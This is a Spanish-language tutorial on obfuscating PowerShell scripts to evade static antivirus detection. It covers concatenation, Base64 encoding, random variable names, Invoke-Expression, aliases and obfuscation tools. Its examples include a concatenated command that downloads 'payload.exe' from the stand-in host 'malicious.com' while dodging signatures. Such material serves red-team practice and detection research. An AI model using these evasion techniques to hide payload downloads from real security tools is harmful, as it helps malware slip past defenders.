# Técnicas de Ofuscación en PowerShell para Evasión de Detección Estática

---

## ¿Qué es la Ofuscación en PowerShell?

La ofuscación consiste en alterar un script para hacerlo más difícil de analizar por herramientas de seguridad como antivirus o sistemas de análisis estático, manteniendo su comportamiento original. Esto se logra transformando el código en formas menos reconocibles para firmas predefinidas o heurísticas básicas.

---

## Técnicas de Ofuscación

### 1. Concatenación de Cadenas
Divide comandos o cadenas en fragmentos que se unen en tiempo de ejecución, evitando que aparezcan palabras clave completas en el código.

- **Ejemplo:**
  ```powershell
  $cmd = 'G' + 'et-' + 'Process'
  & $cmd
  ```
- **Ventaja:** Dificulta la identificación de comandos como `Get-Process`.

### 2. Codificación de Caracteres
Codifica el script o partes de él, como en Base64, para ocultar su contenido legible.

- **Ejemplo:**
  ```powershell
  $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('Get-Process'))
  powershell -EncodedCommand $encoded
  ```
- **Ventaja:** El script no es legible sin decodificación previa.

### 3. Uso de Variables Aleatorias
Reemplaza nombres de variables o funciones con cadenas generadas aleatoriamente.

- **Ejemplo:**
  ```powershell
  $x7k9p2 = 'http://malicious.com'
  Invoke-WebRequest -Uri $x7k9p2
  ```
- **Ventaja:** Evita coincidencias con nombres comunes en firmas de detección.

### 4. Inyección de Código Dinámico
Usa `Invoke-Expression` para ejecutar código generado en tiempo de ejecución, ocultando la lógica principal.

- **Ejemplo:**
  ```powershell
  $code = 'Get-' + 'Process'
  Invoke-Expression $code
  ```
- **Ventaja:** El código malicioso no está explícito en el script.

### 5. Uso de Alias
Sustituye comandos por sus alias para disfrazarlos.

- **Ejemplo:**
  ```powershell
  gps  # En lugar de Get-Process
  ```
- **Ventaja:** Los alias son menos obvios para herramientas de análisis.

### 6. Ofuscación de Sintaxis
Aprovecha la flexibilidad de PowerShell para escribir comandos de forma no convencional.

- **Ejemplo:**
  ```powershell
  Get-Process | ? { $_.Name -eq 'explorer' }
  ```
- **Ventaja:** Complica la lectura automática del script.

---

## Herramientas Útiles

- **Invoke-Obfuscation**: Automatiza la aplicación de múltiples técnicas de ofuscación.
  - **Uso Básico:**
    ```powershell
    Import-Module Invoke-Obfuscation.psd1
    Invoke-Obfuscation -ScriptPath 'script.ps1' -OutputPath 'obfuscated.ps1'
    ```
  - **Recurso:** [GitHub](https://github.com/danielbohannon/Invoke-Obfuscation)

- **PSDuck**: Ofrece capas adicionales de ofuscación.
  - **Uso Básico:**
    ```powershell
    Import-Module PSDuck.psm1
    PSDuck -ScriptPath 'script.ps1' -OutputPath 'obfuscated.ps1'
    ```
  - **Recurso:** [GitHub](https://github.com/PSDuck/PSDuck)

- **argfuscator**: Sitio para ofuscar comandos con diferentes personalizaciones
  - [Recurso](https://argfuscator.net/)

---

## Ejemplos Prácticos

### Concatenación de Cadenas
```powershell
# Original
Invoke-WebRequest -Uri 'http://malicious.com/payload.exe' -OutFile 'payload.exe'

# Ofuscado
$part1 = 'Invoke-Web'
$part2 = 'Request'
$uri = 'http://' + 'malicious' + '.com/payload.exe'
$out = 'pay' + 'load.exe'
& ($part1 + $part2) -Uri $uri -OutFile $out
```

### Codificación Base64
```powershell
# Original
Get-Process

# Ofuscado
$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('Get-Process'))
powershell -EncodedCommand $encoded
```

### Variables Aleatorias
```powershell
# Original
$url = 'http://malicious.com'
Invoke-WebRequest -Uri $url

# Ofuscado
$z9m4q1 = 'http://malicious.com'
Invoke-WebRequest -Uri $z9m4q1
```

---

## Consideraciones Importantes

- **Limitaciones:** No protege contra análisis dinámico ni heurísticas avanzadas.
- **Riesgos:** La ofuscación excesiva puede generar errores o levantar sospechas.
- **Ética:** Úsalo solo en entornos autorizados y legales, como pruebas de seguridad.

---

## Recursos Adicionales

- [Artículos sobre Ofuscación](https://www.blackhat.com/docs/us-17/thursday/us-17-Bohannon-Revoke-Obfuscation-PowerShell-Obfuscation-Detection-And%20Evasion-Using-Science-wp.pdf)
